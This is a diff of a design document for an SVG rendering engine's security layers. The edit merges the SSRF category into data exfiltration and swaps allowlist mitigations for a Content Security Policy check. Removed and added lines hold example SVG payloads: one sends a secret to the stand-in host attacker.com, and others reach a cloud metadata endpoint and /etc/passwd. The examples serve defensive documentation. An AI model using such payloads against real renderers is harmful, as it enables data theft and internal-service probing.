@@ -44,20 +44,17 @@ flowchart TD
     class WARN1,WARN2,WARN3,WARN4,WARN5 warn;
 ```
 
-The five layers defend against three kinds of attack:
+The five layers defend against two kinds of attack:
 
 1. **Resource exhaustion** — wastes CPU, memory, or stack until the engine
    hangs or crashes (DoS). Elements: nested `<g>`/`<svg>`, `<use>`,
    `<pattern>`, entity expansion.
 2. **Data exfiltration** — steals readable data and leaks it to an attacker
-   server. Elements: `<style>`.
-3. **SSRF (Server-Side Request Forgery)** — makes the engine fetch an
-   attacker-chosen URL: an internal service, a local `file://` path, or an
-   attacker server (tracking). Elements: `<image>`, `@import`, `@font-face`.
+   server. Elements: `<style>`, `<image>`, `@import`, `@font-face`.
 
 The same category can appear at more than one stage: layers 1, 4 and 5 all
-defend against resource exhaustion, but each guards a different stage of the
-pipeline.
+defend against resource exhaustion, and layers 2 and 3 both defend against
+data exfiltration — each guards a different stage of the pipeline.
 
 ### XML input validation (Stage 1 — Parse)
 **Category:** resource exhaustion — deep nesting
@@ -80,25 +77,18 @@ and element count during tokenization.
 attribute selectors + `url()`.
 
 ### Fetch allowlist (Stage 3 — Fetch)
-**Category:** SSRF (Server-Side Request Forgery) — untrusted fetch
-
-**Example — SSRF (internal service):**
+**Category:** data exfiltration — remote fetch
+**Example:**
 ```svg
-<svg><image href="http://169.254.169.254/latest/meta-data" width="1" height="1"/></svg>
+<svg>
+  <!-- blocked by: Content-Security-Policy: img-src 'self' -->
+  <image href="https://attacker.com/collect?d=SECRET" width="1" height="1"/>
+</svg>
 ```
-**Solution:** origin allowlist — only allowlisted hosts may be reached.
-
-**Example — file disclosure:**
-```svg
-<svg><image href="file:///etc/passwd" width="1" height="1"/></svg>
-```
-**Solution:** scheme allowlist — only `http(s)` and `data:` are fetchable, so `file:` is blocked.
-
-**Example — tracking / exfiltration:**
-```svg
-<svg><image href="https://attacker.com/collect?d=SECRET" width="1" height="1"/></svg>
-```
-**Solution:** origin allowlist — `attacker.com` is not allowlisted, so the request is dropped.
+**Solution:** the engine checks every fetch against the document's Content
+Security Policy (CSP) before sending it. A URL not allowed by the policy, like
+`attacker.com`, is dropped before the request leaves the process, so no
+`<image>`, `@import`, or `@font-face` fetch can leak data to it.
 
 ### Expansion & geometry limits (Stage 4 — Build)
 **Category:** resource exhaustion — `<use>` mutual recursion
